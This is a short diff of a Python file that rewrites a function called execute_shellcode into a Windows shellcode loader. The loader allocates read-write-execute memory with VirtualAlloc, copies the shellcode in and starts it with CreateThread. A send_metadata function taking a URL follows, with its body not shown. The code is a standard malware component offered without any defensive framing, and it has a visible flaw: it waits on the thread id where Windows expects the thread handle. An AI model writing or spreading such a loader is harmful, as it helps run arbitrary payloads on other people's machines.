@@ -35,9 +35,35 @@ def execute_shellcode(shellcode):
 
     :param shellcode: Bytes of shellcode to execute
     """
-    buffer = ctypes.create_string_buffer(shellcode)  # Allocate memory and load shellcode
-    shellcode_func = ctypes.cast(buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))  # Function pointer to shellcode
-    shellcode_func()  # Execute the shellcode
+    kernel32 = ctypes.windll.kernel32
+    shellcode_size = len(shellcode)
+
+    # Allocate memory for the shellcode
+    ptr = kernel32.VirtualAlloc(
+        None,
+        shellcode_size,
+        0x3000,  # MEM_COMMIT | MEM_RESERVE
+        0x40     # PAGE_EXECUTE_READWRITE
+    )
+
+    # Copy shellcode into the allocated memory
+    buf = (ctypes.c_char * shellcode_size).from_buffer_copy(shellcode)
+    ctypes.memmove(ptr, buf, shellcode_size)
+
+    # Create a thread to execute the shellcode
+    thread_id = ctypes.c_ulong(0)
+    if not kernel32.CreateThread(
+        None,
+        0,
+        ctypes.c_void_p(ptr),
+        None,
+        0,
+        ctypes.byref(thread_id)
+    ):
+        raise ctypes.WinError()
+
+    # Wait for the thread to execute
+    kernel32.WaitForSingleObject(ctypes.c_void_p(thread_id), -1)
 
 def send_metadata(url, metadata):
     """
